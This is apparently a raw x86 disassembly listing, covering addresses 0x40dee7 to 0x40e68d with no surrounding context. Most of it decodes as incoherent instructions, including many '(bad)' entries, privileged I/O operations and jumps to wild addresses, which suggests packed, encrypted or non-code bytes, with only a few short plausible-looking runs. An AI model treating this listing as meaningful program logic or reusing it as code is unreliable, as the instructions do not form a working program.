  40dee7:	fadd   QWORD PTR [edi-0x31]
  40deea:	iret   
  40deeb:	loop   0x40de9c
  40deed:	cmp    eax,0xa2fc6c3c
  40def2:	test   eax,0x9a743279
  40def7:	jae    0x40defc
  40def9:	ror    DWORD PTR [ebx+0x7b],cl
  40defc:	and    dl,BYTE PTR [ebp+eiz*8+0x52]
  40df00:	sub    al,0x8b
  40df02:	mov    ds:0x6241146,eax
  40df07:	jne    0x40df00
  40df09:	lds    eax,FWORD PTR [esp+edx*2+0x2cf0544f]
  40df10:	pop    ebp
  40df11:	or     al,BYTE PTR [edi]
  40df13:	pop    ecx
  40df14:	out    dx,eax
  40df15:	jmp    0xffba58a9
  40df1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df1b:	nop
  40df1c:	or     dh,0x8f
  40df1f:	repz lahf 
  40df21:	push   esp
  40df22:	mov    ah,0xc5
  40df24:	scas   al,BYTE PTR es:[edi]
  40df25:	or     BYTE PTR [edi-0x43391f1],cl
  40df2b:	nop    DWORD PTR [edx]
  40df2e:	and    DWORD PTR [ebx],edx
  40df30:	icebp  
  40df31:	adc    ebx,ebp
  40df33:	mov    esi,fs
  40df35:	push   edx
  40df36:	retf   
  40df37:	pop    ss
  40df38:	or     eax,0xd10c5b10
  40df3d:	fsin   
  40df3f:	pop    esi
  40df40:	or     al,0x1
  40df42:	sub    edi,DWORD PTR [esi]
  40df44:	stos   BYTE PTR es:[edi],al
  40df45:	mov    edx,0x8e6c016
  40df4a:	bound  esp,QWORD PTR [edx]
  40df4c:	pop    esi
  40df4d:	mov    ebx,edi
  40df4f:	popf   
  40df50:	jl     0x40df6c
  40df52:	mov    ecx,0xe7b8eeab
  40df57:	ja     0x40dfad
  40df59:	loopne 0x40df09
  40df5b:	loope  0x40dfcd
  40df5d:	adc    edi,esp
  40df5f:	sbb    DWORD PTR [esi],ecx
  40df61:	out    dx,eax
  40df62:	pop    ebp
  40df63:	cmp    DWORD PTR [edx],0xdeee51bd
  40df69:	cmp    dl,BYTE PTR [edx]
  40df6b:	pop    edi
  40df6c:	mov    edx,DWORD PTR [ebx]
  40df6e:	push   ebp
  40df6f:	and    cl,BYTE PTR [esi]
  40df71:	xchg   edi,eax
  40df72:	cdq    
  40df73:	dec    edx
  40df74:	adc    ah,0x3c
  40df77:	into   
  40df78:	call   0xc6a09671
  40df7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df7e:	lods   al,BYTE PTR ds:[esi]
  40df7f:	adc    eax,0x3db82c53
  40df84:	inc    ecx
  40df85:	pop    ds
  40df86:	or     eax,DWORD PTR [edx+0x15]
  40df89:	sbb    al,0x3
  40df8b:	sub    eax,0x73b17e0
  40df90:	jecxz  0x40dfdc
  40df92:	out    dx,eax
  40df93:	cmp    bh,bl
  40df95:	test   al,0xf3
  40df97:	addr16 push es
  40df99:	mov    es:0x27b5961d,al
  40df9f:	sub    BYTE PTR [edx+0x1d],ah
  40dfa2:	add    BYTE PTR [ebx],cl
  40dfa4:	xor    al,0x65
  40dfa6:	loopne 0x40df33
  40dfa8:	push   ebp
  40dfa9:	mov    ah,0x33
  40dfab:	rol    cl,cl
  40dfad:	loopne 0x40dfcd
  40dfaf:	mov    ax,dx
  40dfb2:	or     ax,cx
  40dfb5:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfb8:	cmp    WORD PTR [ecx],ax
  40dfbb:	je     0x40eb64
  40dfc1:	mov    eax,DWORD PTR [ebp+0x14]
  40dfc4:	sub    DWORD PTR [ebp-0x4],eax
  40dfc7:	mov    eax,DWORD PTR [esi]
  40dfc9:	mov    ecx,DWORD PTR [esi+0x4]
  40dfcc:	mov    ecx,eax
  40dfce:	jmp    0x40e558
  40dfd3:	push   ebx
  40dfd4:	cli    
  40dfd5:	test   dh,ah
  40dfd7:	fs pop eax
  40dfd9:	pop    ecx
  40dfda:	jb     0x40df93
  40dfdc:	shr    DWORD PTR [esi+ebp*4-0x57f60994],1
  40dfe3:	sub    ch,BYTE PTR [eax+0x43d1616]
  40dfe9:	push   ss
  40dfea:	push   ss
  40dfeb:	pusha  
  40dfec:	push   esp
  40dfed:	sbb    dl,BYTE PTR ds:0xd14205fc
  40dff3:	mov    ebp,0x9c93fa69
  40dff8:	lds    edi,FWORD PTR [eax-0x7b35a198]
  40dffe:	aam    0xc8
  40e000:	and    ebx,DWORD PTR [edi-0x6e]
  40e003:	into   
  40e004:	mov    DWORD PTR [ebp+0x65],0x4ede1815
  40e00b:	xchg   ebp,eax
  40e00c:	aad    0xc4
  40e00e:	inc    ecx
  40e00f:	sbb    dh,BYTE PTR [ebp+0x48ea99a4]
  40e015:	(bad)  
  40e016:	fcom   QWORD PTR [edx-0x1e]
  40e019:	ret    
  40e01a:	jecxz  0x40e097
  40e01c:	sbb    BYTE PTR [edx],bl
  40e01e:	sbb    DWORD PTR [ebx],eax
  40e020:	shr    BYTE PTR [edx+0x24],cl
  40e023:	jge    0x40dfb7
  40e025:	fstp   DWORD PTR [eax-0x64]
  40e028:	ret    0x6e4
  40e02b:	js     0x40dfbd
  40e02d:	add    eax,0x44fe2225
  40e032:	jns    0x40e09e
  40e034:	imul   eax,DWORD PTR [edx+ecx*2],0x8994825e
  40e03b:	push   ebp
  40e03c:	inc    esi
  40e03d:	push   esi
  40e03e:	enter  0x6ed,0x2d
  40e042:	or     BYTE PTR [eax],0xe9
  40e045:	dec    ebp
  40e046:	and    DWORD PTR [eax],ebx
  40e048:	ja     0x40e06b
  40e04a:	ret    0x2fb3
  40e04d:	pop    ss
  40e04e:	sbb    ebx,DWORD PTR [ecx-0x74]
  40e051:	(bad)  
  40e052:	aam    0xe8
  40e054:	scas   al,BYTE PTR es:[edi]
  40e055:	std    
  40e056:	repz loope 0x40e060
  40e059:	jl     0x40e0b5
  40e05b:	outs   dx,DWORD PTR ds:[esi]
  40e05c:	xchg   edi,eax
  40e05d:	xor    DWORD PTR [edx-0x78],edi
  40e060:	cs and BYTE PTR ds:[ebx+0x0],cl
  40e065:	lods   al,BYTE PTR ds:[esi]
  40e066:	mov    WORD PTR [esi+edi*8],cs
  40e069:	mov    al,dh
  40e06b:	inc    ebx
  40e06c:	inc    ebx
  40e06d:	ficomp DWORD PTR [ebx+0x4f]
  40e070:	fsubr  st,st(0)
  40e072:	pushf  
  40e073:	and    BYTE PTR [edi-0x13b04ca],ah
  40e079:	pop    ebx
  40e07a:	jnp    0x40e0aa
  40e07c:	js     0x40e056
  40e07e:	cdq    
  40e07f:	fmul   QWORD PTR [ebp-0x7e]
  40e082:	outs   dx,DWORD PTR ds:[esi]
  40e083:	mov    edi,0x444ab570
  40e088:	jo     0x40e0ff
  40e08a:	arpl   WORD PTR [edi],dx
  40e08c:	call   0x25ef:0x51ab81db
  40e093:	mov    al,0xe6
  40e095:	icebp  
  40e096:	lods   al,BYTE PTR ds:[esi]
  40e097:	mov    ecx,0xe8b8a448
  40e09c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e09d:	out    0x98,eax
  40e09f:	jmp    0x813566af
  40e0a4:	lea    ebp,[esi-0xf]
  40e0a7:	(bad)  
  40e0a8:	mov    ebp,0xbcb071ad
  40e0ad:	stos   DWORD PTR es:[edi],eax
  40e0ae:	mov    al,0xeb
  40e0b0:	fisttp QWORD PTR [ecx-0x71cbfb99]
  40e0b6:	adc    al,0x8
  40e0b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0b9:	aad    0x2d
  40e0bb:	jb     0x40e054
  40e0bd:	mov    edx,0x55a9ea1b
  40e0c2:	jo     0x40e115
  40e0c4:	sbb    eax,0xdee99237
  40e0c9:	loope  0x40e0a2
  40e0cb:	sbb    ebx,edx
  40e0cd:	jmp    0xa2f8d7d9
  40e0d2:	cmp    dh,BYTE PTR [ebp+0x7eeb1961]
  40e0d8:	test   BYTE PTR [ecx-0x1fcd3b99],bl
  40e0de:	sbb    BYTE PTR [edx+0x4a23d33f],dl
  40e0e4:	inc    cl
  40e0e6:	or     eax,0x994e5893
  40e0eb:	mov    dh,0x26
  40e0ed:	sub    bh,bl
  40e0ef:	(bad)  
  40e0f0:	inc    ecx
  40e0f1:	aam    0xd2
  40e0f3:	jge    0x40e15d
  40e0f5:	mov    WORD PTR [ebp+esi*8-0x3d],ds
  40e0f9:	xor    DWORD PTR [ebx+edi*2-0x348bd439],0xbe16027c
  40e104:	inc    ebp
  40e105:	push   ds
  40e106:	imul   edx,DWORD PTR [ecx+eiz*8-0x6c2f655e],0xf80d4656
  40e111:	mov    dh,0xf0
  40e113:	jo     0x40e0e7
  40e115:	mov    al,0x74
  40e117:	push   esi
  40e118:	dec    edx
  40e119:	dec    esi
  40e11a:	fimul  WORD PTR [ebp-0x1b]
  40e11d:	cmp    BYTE PTR [esi-0x55],al
  40e120:	dec    edi
  40e121:	sbb    eax,0x603e59ed
  40e126:	xchg   ebp,eax
  40e127:	test   BYTE PTR [si],bl
  40e12a:	stos   DWORD PTR es:[edi],eax
  40e12b:	retf   0x266a
  40e12e:	mov    cl,0x85
  40e130:	jecxz  0x40e0e0
  40e132:	add    edx,DWORD PTR [eax-0x458f025a]
  40e138:	(bad)
  40e13b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e13c:	int    0xa0
  40e13e:	leave  
  40e13f:	in     al,dx
  40e140:	dec    edi
  40e141:	imul   dl
  40e143:	mov    esi,0xbcae2aad
  40e148:	fidiv  WORD PTR [ecx+eiz*1]
  40e14b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e14c:	repz push esp
  40e14e:	(bad)  
  40e14f:	xchg   esp,eax
  40e150:	into   
  40e151:	add    dh,dh
  40e153:	cld    
  40e154:	sbb    BYTE PTR [ebx],cl
  40e156:	xchg   edx,eax
  40e157:	mov    eax,ds:0x598b0c2
  40e15c:	mov    ch,0x46
  40e15e:	lock rcl al,1
  40e161:	rcr    DWORD PTR [edx],0x34
  40e164:	sub    BYTE PTR ds:0xa880d9c6,dh
  40e16a:	jecxz  0x40e1c7
  40e16c:	pusha  
  40e16d:	push   ss
  40e16e:	xchg   ebp,eax
  40e16f:	shl    DWORD PTR [ebx+0x75bc1c76],cl
  40e175:	jl     0x40e1d5
  40e177:	jl     0x40e1b8
  40e179:	cdq    
  40e17a:	and    DWORD PTR [ecx-0x794e9309],0xffffffa6
  40e181:	inc    ecx
  40e182:	fadd   st,st(5)
  40e184:	icebp  
  40e185:	pop    ecx
  40e186:	das    
  40e187:	push   0x98877bf3
  40e18c:	ja     0x40e1b3
  40e18e:	daa    
  40e18f:	ss pop eax
  40e191:	pop    esp
  40e192:	int3   
  40e193:	mov    bh,0xb6
  40e195:	iret   
  40e196:	aad    0x3
  40e198:	mov    eax,ds:0x3e240c30
  40e19d:	std    
  40e19e:	pop    ecx
  40e19f:	scas   al,BYTE PTR es:[edi]
  40e1a0:	push   cs
  40e1a1:	or     BYTE PTR [ebp+0x50],ch
  40e1a4:	xlat   BYTE PTR ds:[ebx]
  40e1a5:	or     eax,eax
  40e1a7:	pop    ebp
  40e1a8:	sub    al,0xfd
  40e1aa:	loop   0x40e15b
  40e1ac:	xchg   ecx,eax
  40e1ad:	mov    cl,0x7e
  40e1af:	push   ss
  40e1b0:	jge    0x40e1fe
  40e1b2:	add    al,0xfc
  40e1b4:	sbb    eax,0xf00f4805
  40e1b9:	add    ebx,DWORD PTR [esi+0x4f]
  40e1bc:	jmp    0x40e15e
  40e1be:	xchg   edx,eax
  40e1bf:	sti    
  40e1c0:	adc    bh,BYTE PTR [ebx-0x6c63cef6]
  40e1c6:	in     al,dx
  40e1c7:	arpl   WORD PTR [ebp-0x2ede0d8e],di
  40e1cd:	push   ebx
  40e1ce:	int    0xfd
  40e1d0:	or     ah,BYTE PTR [ebp-0x6aa86eb3]
  40e1d6:	loopne 0x40e244
  40e1d8:	mov    al,0x29
  40e1da:	xchg   edi,eax
  40e1db:	(bad)  
  40e1dc:	call   0xdb2e:0x172fd6d6
  40e1e3:	int    0x21
  40e1e5:	xor    bh,BYTE PTR [ebp-0x6b281ce1]
  40e1eb:	pop    es
  40e1ec:	and    eax,0xa95d79ff
  40e1f1:	cmp    BYTE PTR [ecx],bl
  40e1f3:	imul   ecx,DWORD PTR [esi+eax*1-0x4],0xf6336a93
  40e1fb:	mov    dl,al
  40e1fd:	imul   esp,DWORD PTR [ecx+0x19],0xc405134a
  40e204:	push   ecx
  40e205:	shl    BYTE PTR [ebp-0xbe5b51],0x23
  40e20c:	add    ecx,ebp
  40e20e:	std    
  40e20f:	push   esp
  40e210:	fadd   st,st(4)
  40e212:	cli    
  40e213:	test   BYTE PTR [esi],0xbf
  40e216:	xor    al,0x23
  40e218:	dec    ebx
  40e219:	mov    ah,0x99
  40e21b:	jb     0x40e19d
  40e21d:	outs   dx,BYTE PTR ds:[esi]
  40e21e:	int3   
  40e21f:	stos   DWORD PTR es:[edi],eax
  40e220:	jg     0x40e23a
  40e222:	das    
  40e223:	mov    ?,WORD PTR [eax+0x4b]
  40e226:	ror    DWORD PTR [esi+0x487993ad],cl
  40e22c:	(bad)  
  40e22d:	imul   ebx,DWORD PTR [edi],0x36aa1b0
  40e233:	popf   
  40e234:	fisubr WORD PTR ds:0xeef964f5
  40e23a:	ins    DWORD PTR es:[edi],dx
  40e23b:	out    0x3e,al
  40e23d:	and    al,0x34
  40e23f:	xor    al,0x11
  40e241:	lds    esp,FWORD PTR [ecx+0x4f]
  40e244:	sbb    eax,0xf5526ef5
  40e249:	mov    eax,ds:0x6b4c74b3
  40e24e:	xchg   esp,eax
  40e24f:	jge    0x40e2bf
  40e251:	xchg   ebx,eax
  40e252:	dec    eax
  40e253:	xchg   edx,eax
  40e254:	cld    
  40e255:	sub    BYTE PTR [ecx+0x22],bh
  40e258:	and    al,0xfa
  40e25a:	(bad)  
  40e25b:	popa   
  40e25c:	pop    ecx
  40e25d:	pushf  
  40e25e:	es xor eax,0x8c421964
  40e264:	mov    eax,ds:0xdfd57ef8
  40e269:	mov    ebx,eax
  40e26b:	not    cl
  40e26d:	mov    WORD PTR [esi+0x59af691b],gs
  40e273:	fdiv   DWORD PTR [edx]
  40e275:	iret   
  40e276:	cli    
  40e277:	sub    bl,BYTE PTR [ebx+ebp*2-0x20]
  40e27b:	jb     0x40e228
  40e27d:	popf   
  40e27e:	xor    DWORD PTR ds:0x1866d51c,eax
  40e284:	mov    fs:0xb80dca25,eax
  40e28a:	sub    ch,BYTE PTR [edx-0x31]
  40e28d:	or     BYTE PTR [edi-0x73],al
  40e290:	enter  0xae83,0xe7
  40e294:	adc    ch,bh
  40e296:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e297:	fs shr bl,cl
  40e29a:	clc    
  40e29b:	call   0xf6e3:0xe1c03adc
  40e2a2:	jmp    0x40e296
  40e2a4:	sbb    BYTE PTR [edx+0x57],ch
  40e2a7:	lods   eax,DWORD PTR ds:[esi]
  40e2a8:	scas   eax,DWORD PTR es:[edi]
  40e2a9:	call   0x325bbea5
  40e2ae:	jnp    0x40e2db
  40e2b0:	pop    es
  40e2b1:	repnz mov al,0xc0
  40e2b4:	repz ret 
  40e2b6:	inc    ebp
  40e2b7:	mov    dl,dh
  40e2b9:	inc    esi
  40e2ba:	pop    esi
  40e2bb:	rol    BYTE PTR [edi+0x57],0xd3
  40e2bf:	out    dx,al
  40e2c0:	adc    dl,bh
  40e2c2:	inc    edi
  40e2c3:	test   eax,0x8dc966b5
  40e2c8:	or     al,0x4
  40e2ca:	jecxz  0x40e2c3
  40e2cc:	jl     0x40e2f5
  40e2ce:	cdq    
  40e2cf:	mov    al,ds:0xff3bc752
  40e2d4:	not    DWORD PTR [ebp-0x5d]
  40e2d7:	mov    edx,DWORD PTR [esi]
  40e2d9:	ds lock stos BYTE PTR es:[edi],al
  40e2dc:	shr    DWORD PTR [edx],cl
  40e2de:	loope  0x40e2da
  40e2e0:	hlt    
  40e2e1:	aas    
  40e2e2:	mov    ebp,0x81b3a225
  40e2e7:	dec    esp
  40e2e8:	repz retf 
  40e2ea:	rcr    BYTE PTR [edx+edi*2+0x16],0x67
  40e2ef:	mov    eax,ds:0xa40f270b
  40e2f4:	adc    ch,BYTE PTR [ebx-0x2f]
  40e2f7:	ret    0xcd4b
  40e2fa:	js     0x40e362
  40e2fc:	sbb    WORD PTR [ebp-0x688a5225],di
  40e303:	popa   
  40e304:	push   eax
  40e305:	hlt    
  40e306:	ret    
  40e307:	(bad)  fs:[eax-0x38139df6]
  40e30e:	adc    ah,BYTE PTR [ebx-0x5c7a1770]
  40e314:	inc    esi
  40e315:	jo     0x40e345
  40e317:	ret    
  40e318:	(bad)  
  40e31a:	sub    BYTE PTR [ebp-0x1f505601],ah
  40e320:	in     eax,dx
  40e321:	popa   
  40e322:	je     0x40e2ba
  40e324:	in     al,0xc7
  40e326:	sbb    cl,ah
  40e328:	pop    es
  40e329:	div    cl
  40e32b:	push   ecx
  40e32c:	mov    gs:0xb087cf89,eax
  40e332:	mov    bl,0x48
  40e334:	pop    ds
  40e335:	fild   DWORD PTR [ebp+0x61]
  40e338:	jnp    0x40e30c
  40e33a:	shl    DWORD PTR [edi+eax*8],1
  40e33d:	into   
  40e33e:	adc    ah,BYTE PTR [edi+edi*1]
  40e341:	sub    DWORD PTR [ebp+ebp*4+0x491e9378],ebx
  40e348:	and    BYTE PTR [edi+0x67ea5afc],al
  40e34e:	js     0x40e370
  40e350:	jae    0x40e334
  40e352:	xchg   esi,eax
  40e353:	lods   eax,DWORD PTR ds:[esi]
  40e354:	dec    ebx
  40e355:	loopne 0x40e3b9
  40e357:	out    0x3,eax
  40e359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e35a:	int    0xd7
  40e35c:	jbe    0x40e33a
  40e35e:	bnd jmp 0xa7996186
  40e364:	mov    ecx,0x7ebc968c
  40e369:	shr    esp,cl
  40e36b:	push   cs
  40e36c:	mov    edx,0x1c7764a
  40e371:	jns    0x40e3c3
  40e373:	sbb    eax,0xa9c22ce9
  40e378:	scas   al,BYTE PTR es:[edi]
  40e379:	std    
  40e37a:	sub    al,0x50
  40e37c:	xor    bh,bl
  40e37e:	or     eax,0xb2b4bb61
  40e383:	dec    si
  40e385:	jae    0x40e3af
  40e387:	std    
  40e388:	cwde   
  40e389:	jmp    0x40e3d8
  40e38b:	xchg   esi,eax
  40e38c:	mov    al,ds:0x32f87987
  40e391:	inc    edi
  40e392:	call   0x434b21a5
  40e397:	inc    ebp
  40e398:	rol    DWORD PTR ds:0xe42be719,cl
  40e39e:	cmp    DWORD PTR [ebx],esp
  40e3a0:	shl    DWORD PTR [edi+0x52],0x7d
  40e3a4:	cmp    eax,0xa94590da
  40e3a9:	inc    ecx
  40e3aa:	ja     0x40e3b2
  40e3ac:	push   eax
  40e3ad:	js     0x40e382
  40e3af:	mov    eax,0xc3b03c9b
  40e3b4:	jae    0x40e399
  40e3b6:	inc    esp
  40e3b7:	je     0x40e368
  40e3b9:	scas   al,BYTE PTR es:[edi]
  40e3ba:	and    eax,0x746cb6b0
  40e3bf:	pop    esp
  40e3c0:	xchg   esp,eax
  40e3c1:	scas   ax,WORD PTR es:[edi]
  40e3c3:	mov    edi,0x29999631
  40e3c8:	sbb    ch,BYTE PTR [edi]
  40e3ca:	jnp    0x40e3ff
  40e3cc:	jo     0x40e42a
  40e3ce:	jecxz  0x40e417
  40e3d0:	inc    eax
  40e3d1:	cmp    DWORD PTR [esi],ebp
  40e3d3:	adc    DWORD PTR [ebp+0x6fb1bfc1],0xffffffa1
  40e3da:	and    BYTE PTR [edi+0x31],dh
  40e3dd:	in     al,dx
  40e3de:	int    0x74
  40e3e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3e1:	imul   ebx,DWORD PTR [edi],0xed1ebe58
  40e3e7:	inc    ebp
  40e3e8:	cwde   
  40e3e9:	mov    BYTE PTR [ecx],bl
  40e3eb:	adc    BYTE PTR es:[ecx],0x58
  40e3ef:	push   ds
  40e3f0:	(bad)  
  40e3f1:	jmp    DWORD PTR [ebp+0xf]
  40e3f4:	aad    0xea
  40e3f6:	loopne 0x40e3fd
  40e3f8:	rdpmc  
  40e3fa:	imul   edi,DWORD PTR [edx+0x43fbc2e8],0x6d4bc9ce
  40e404:	cs sub eax,0xfc5bfa04
  40e40a:	shl    BYTE PTR [ecx],cl
  40e40c:	jno    0x40e40e
  40e40e:	add    esi,ecx
  40e410:	outs   dx,BYTE PTR ds:[esi]
  40e411:	push   edi
  40e412:	out    0xad,eax
  40e414:	ss mov ebp,0xd5dfd53e
  40e41a:	icebp  
  40e41b:	or     cl,al
  40e41d:	xchg   esi,eax
  40e41e:	mov    eax,ds:0xe3ca4f1c
  40e423:	out    0x2,eax
  40e425:	pop    esp
  40e426:	push   esp
  40e427:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e428:	mov    bh,0x25
  40e42a:	mov    bh,0x6
  40e42c:	addr16 aaa 
  40e42e:	call   0x81edb677
  40e433:	add    esp,esi
  40e435:	jo     0x40e42c
  40e437:	in     eax,0x6f
  40e439:	ins    DWORD PTR es:[edi],dx
  40e43a:	(bad)  [edi+0x17dee342]
  40e440:	out    0x2f,al
  40e442:	sbb    al,0xf3
  40e444:	iret   
  40e445:	imul   ecx,DWORD PTR [eax-0x25],0xa579102e
  40e44c:	jle    0x40e45f
  40e44e:	jle    0x40e46e
  40e450:	into   
  40e451:	lea    esp,[edi-0x10da0049]
  40e457:	mov    edx,0x644ffcbe
  40e45c:	shl    BYTE PTR cs:[ebx-0x39861fa9],1
  40e463:	pop    edi
  40e464:	xchg   ch,ah
  40e466:	adc    ebx,DWORD PTR [ebp-0x77]
  40e469:	add    edx,esi
  40e46b:	push   edi
  40e46c:	jl     0x40e46d
  40e46e:	into   
  40e46f:	mov    ds:0x435ace54,al
  40e474:	test   eax,edx
  40e476:	inc    ebp
  40e477:	cmp    eax,0xd30b4842
  40e47c:	sub    eax,0x728da98e
  40e481:	std    
  40e482:	dec    edi
  40e483:	into   
  40e484:	and    al,0xa0
  40e486:	jno    0x40e49d
  40e488:	sbb    BYTE PTR [ebx-0x37],bl
  40e48b:	test   dh,cl
  40e48d:	out    dx,al
  40e48e:	or     eax,0xfccdfa9c
  40e493:	mov    esp,0xb819bb9b
  40e498:	stos   BYTE PTR es:[edi],al
  40e499:	cmc    
  40e49a:	loope  0x40e512
  40e49c:	xor    BYTE PTR [edi],al
  40e49e:	loopne 0x40e43b
  40e4a0:	and    al,0x36
  40e4a2:	sub    al,0xbf
  40e4a4:	push   cs
  40e4a5:	or     cl,BYTE PTR [eax+eax*8+0x2d03ae7c]
  40e4ac:	shl    BYTE PTR [ebp+0x51],0x4b
  40e4b0:	jne    0x40e50c
  40e4b2:	mov    bh,0xa4
  40e4b4:	lds    ebp,FWORD PTR [ecx]
  40e4b6:	or     DWORD PTR ss:[esi],ebp
  40e4b9:	enter  0xfcdc,0xc3
  40e4bd:	(bad)  
  40e4be:	mov    esi,0x944b4d7d
  40e4c3:	fs inc ecx
  40e4c5:	xchg   esi,eax
  40e4c6:	inc    ecx
  40e4c7:	dec    eax
  40e4c8:	sub    edx,ecx
  40e4ca:	fbld   TBYTE PTR [ebp+0x44]
  40e4cd:	imul   ebp,DWORD PTR [edx+0x2a76dc1e],0x53
  40e4d4:	(bad)  
  40e4d5:	push   ss
  40e4d6:	(bad)  
  40e4d8:	aas    
  40e4d9:	nop
  40e4da:	mov    edx,DWORD PTR [edx-0x68393c]
  40e4e0:	push   0xac393e52
  40e4e5:	jg     0x40e50f
  40e4e7:	add    esp,0x97d5db04
  40e4ed:	(bad)  
  40e4ee:	mov    esp,0xa4d4ce60
  40e4f3:	ret    0x64b7
  40e4f6:	icebp  
  40e4f7:	shr    BYTE PTR [eax+ecx*4-0x6e],1
  40e4fb:	out    dx,eax
  40e4fc:	fdiv   DWORD PTR [edi]
  40e4ff:	repz mov dh,0xa4
  40e502:	gs mov dh,0xc2
  40e505:	cld    
  40e506:	aas    
  40e507:	or     al,BYTE PTR [esi-0x2e]
  40e50a:	add    edx,DWORD PTR [ecx]
  40e50c:	sti    
  40e50d:	cmp    al,BYTE PTR [eax+0xb]
  40e510:	jbe    0x40e58c
  40e512:	mov    eax,0xbe43e715
  40e517:	inc    eax
  40e518:	jno    0x40e531
  40e51a:	retf   0xd884
  40e51d:	add    BYTE PTR [edx-0x6f],dl
  40e520:	test   al,0x32
  40e522:	inc    ecx
  40e523:	xchg   esi,eax
  40e524:	jmp    FWORD PTR [ebp-0x42c9b400]
  40e52a:	mov    bh,0x98
  40e52c:	imul   esp,DWORD PTR [esi+0x11],0xfffffffb
  40e530:	push   edi
  40e531:	shr    DWORD PTR [ecx-0x53],0x40
  40e535:	xor    DWORD PTR [edi-0x33],esp
  40e538:	(bad)  
  40e539:	arpl   WORD PTR [ebx+edi*8],bx
  40e53c:	rcl    DWORD PTR [edx-0x6f],0x11
  40e540:	arpl   bx,di
  40e542:	push   eax
  40e543:	pop    edi
  40e544:	jmp    0x40e513
  40e546:	add    DWORD PTR [edx],esi
  40e548:	add    bl,BYTE PTR [esi+ecx*1]
  40e54b:	hlt    
  40e54c:	retf   
  40e54d:	jmp    0xaf81d2d7
  40e552:	mov    ebx,DWORD PTR [ebx+0x70]
  40e555:	pop    edi
  40e556:	pop    edi
  40e557:	vpsraw xmm3,xmm7,XMMWORD PTR [esi]
  40e55b:	xor    ecx,0xc0000000
  40e561:	mov    DWORD PTR [ebp-0x64],ecx
  40e564:	mov    ecx,DWORD PTR [esi]
  40e566:	mov    edx,DWORD PTR [esi+0x4]
  40e569:	xor    edx,0x9c0a89d8
  40e56f:	xor    ecx,0xba699573
  40e575:	shrd   ecx,edx,0x2
  40e579:	shr    edx,0x2
  40e57c:	or     edx,DWORD PTR [ebp-0x64]
  40e57f:	xor    eax,eax
  40e581:	or     ecx,eax
  40e583:	jmp    0x40eb0d
  40e588:	sahf   
  40e589:	or     ah,al
  40e58b:	jp     0x40e525
  40e58d:	cmp    bl,BYTE PTR [eax]
  40e58f:	sub    DWORD PTR [ebx+0x4a],ebp
  40e592:	mov    WORD PTR [esi+0x4a],gs
  40e595:	pop    ss
  40e596:	bound  esi,QWORD PTR [edx+0x61]
  40e599:	xchg   esp,eax
  40e59a:	push   ss
  40e59b:	push   ss
  40e59c:	cmp    eax,0xe3161604
  40e5a1:	aam    0x9e
  40e5a3:	out    0x77,al
  40e5a5:	dec    esi
  40e5a6:	jl     0x40e605
  40e5a8:	mov    cl,0x10
  40e5aa:	dec    edx
  40e5ab:	ds sub eax,0x36b2c7f5
  40e5b1:	aam    0x2d
  40e5b3:	jmp    0x1d2588cb
  40e5b8:	call   0xc195:0x3239d94f
  40e5bf:	arpl   WORD PTR [ebx-0x33f3443d],cx
  40e5c5:	and    DWORD PTR ds:0x9b907785,edx
  40e5cb:	(bad)  
  40e5cc:	leave  
  40e5cd:	in     eax,dx
  40e5ce:	jle    0x40e5a6
  40e5d0:	test   BYTE PTR [edi-0x6e3b6290],ch
  40e5d6:	cmp    eax,0x6c1d69a7
  40e5db:	inc    eax
  40e5dc:	ins    DWORD PTR es:[edi],dx
  40e5dd:	inc    ebx
  40e5de:	pop    ebx
  40e5df:	pop    esi
  40e5e0:	cmc    
  40e5e1:	sbb    bl,BYTE PTR [ebx*2-0x2abd9c0a]
  40e5e8:	stos   BYTE PTR es:[edi],al
  40e5e9:	nop
  40e5ea:	xchg   ecx,eax
  40e5eb:	mov    esp,0xa44aedaa
  40e5f0:	mov    al,ds:0xffcf7ce6
  40e5f5:	push   ebp
  40e5f6:	mov    cl,0x90
  40e5f8:	in     al,dx
  40e5f9:	mov    esi,DWORD PTR [ebx-0x7cd5139a]
  40e5ff:	(bad)  
  40e600:	ret    
  40e601:	icebp  
  40e602:	cs dec edi
  40e604:	adc    DWORD PTR [esi-0x45885364],edx
  40e60a:	sbb    ebp,DWORD PTR [ecx]
  40e60c:	xchg   DWORD PTR [edi+0xc],edx
  40e60f:	ins    DWORD PTR es:[edi],dx
  40e610:	add    BYTE PTR [esi+0x59],dl
  40e613:	fwait
  40e614:	xor    al,0x37
  40e616:	imul   eax,ebx,0x171f6d84
  40e61c:	cmp    DWORD PTR [ebx-0x374b1deb],ecx
  40e622:	dec    edi
  40e623:	shr    BYTE PTR [ecx-0x3b],cl
  40e626:	mov    fs,dx
  40e629:	adc    ecx,DWORD PTR [edi]
  40e62b:	mov    esi,0xa85f32d
  40e630:	cmc    
  40e631:	cmp    eax,eax
  40e633:	push   ds
  40e634:	mov    ch,BYTE PTR [ebx+0x26350c3e]
  40e63a:	push   0xfec657cb
  40e63f:	cmp    BYTE PTR [eax+0x533ba76],0x70
  40e646:	outs   dx,BYTE PTR ds:[esi]
  40e647:	adc    al,0x84
  40e649:	jge    0x40e649
  40e64b:	xor    esp,esi
  40e64d:	mov    BYTE PTR [ecx-0x5bf46b37],dl
  40e653:	xor    BYTE PTR [ebx+0x373d2d86],0xad
  40e65a:	sbb    ebp,DWORD PTR [edi-0x13]
  40e65d:	shl    ecx,1
  40e65f:	mov    dl,0x3b
  40e661:	cli    
  40e662:	test   DWORD PTR [edx-0x4b],ebp
  40e665:	retf   
  40e666:	or     al,0xb2
  40e668:	mov    ah,BYTE PTR [edi+0x4ee6ec15]
  40e66e:	adc    DWORD PTR [esi],0xb7954366
  40e674:	mov    dl,0xa5
  40e676:	push   ebp
  40e677:	mov    dl,BYTE PTR [edi+0xe]
  40e67a:	sub    ebp,DWORD PTR [edi-0x525396c]
  40e680:	cmp    eax,0x91749674
  40e685:	fiadd  DWORD PTR [esi+0x574e360e]
  40e68b:	test   al,0x75
  40e68d:	pop    ds
